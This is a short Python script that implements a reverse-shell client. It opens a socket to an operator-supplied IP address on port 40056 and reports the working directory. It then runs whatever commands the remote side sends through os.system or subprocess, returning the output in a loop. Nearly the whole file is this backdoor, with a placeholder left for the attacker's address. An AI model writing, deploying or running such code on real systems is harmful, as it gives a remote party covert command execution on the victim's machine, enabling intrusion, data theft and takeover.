import os
import socket
from time import sleep
from threading import Thread
import shutil
import subprocess as sp

SEP = "<sep>"
suc_connection = False

class Session:
    def __init__(self, ip, port, BUFFER_SIZE):
        self.ip = ip
        self.port = port
        self.BUFFER_SIZE = BUFFER_SIZE
    
    def connect(self):
            sock = socket.socket()
            address = (self.ip,self.port)
            sock.connect(address)
            sleep(0.8)
            cwd = os.getcwd().encode()
            sock.send(cwd)

            while True:
                command = sock.recv(self.BUFFER_SIZE).decode()
                split_command = command.split(" ")
                if not command.split():
                    continue
                elif split_command[0] == "start":
                    os.system(command)
                elif split_command[0] == "cd":
                    try:
                        os.chdir(''.join(split_command[1:]))
                    except FileNotFoundError:
                        print("no such path or directory!")
                    else:
                        output = ""
                elif command.lower() == "exit":
                    break
                output = sp.getoutput(command)
                cwd = os.getcwd()
                msg = f"{output}{SEP}{cwd}"
                sock.send(msg.encode())
            sock.close()



if __name__ == "__main__":
    ip_address = socket.gethostbyname(socket.gethostname())
    client = Session("YOUR IP ADDRESS", 40056, 1024*3)
                    # din ip addresse  #port #buffer
    client.connect()





